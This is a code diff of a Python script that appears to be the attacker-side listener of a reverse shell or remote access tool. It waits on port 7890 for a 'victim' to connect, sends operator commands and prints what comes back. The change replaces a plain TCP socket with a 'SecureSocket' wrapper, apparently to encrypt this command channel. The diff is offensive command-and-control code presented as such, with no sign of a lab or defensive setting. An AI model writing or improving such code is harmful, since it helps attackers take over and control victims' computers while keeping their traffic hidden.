@@ -1,6 +1,7 @@
 import socket
 import sys
 from payload import Payload
+from secure_socket import SecureSocket
 
 # Port listening for the victim's connection
 port = 7890
@@ -29,19 +30,8 @@ def parse_custom_command(cmd: str) -> str:
 def create_socket():
     global output_style
 
-    # Create a TCP/IP socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # Bind the socket to accept any ip at port
-    server_address = ('0.0.0.0', port)
-    sock.bind(server_address)
-
-    print("Waiting for connection ...")
-    sock.listen()
-
-    # Accept an incoming connection
-    connection, client_address = sock.accept()
-    print('Connected by', client_address)
+    secure_socket = SecureSocket()
+    secure_socket.wait_for_connection()
 
     # Receive data from the client
     while True:
@@ -57,9 +47,8 @@ def create_socket():
             continue
 
         command = bytes(command, encoding='utf-8')
-        connection.sendall(command)
-
-        packet = connection.recv(1024)
+        secure_socket.send(command)
+        packet = secure_socket.receive()
         payload = Payload(raw_packet=packet)
 
         print(payload.format_output(output_style))
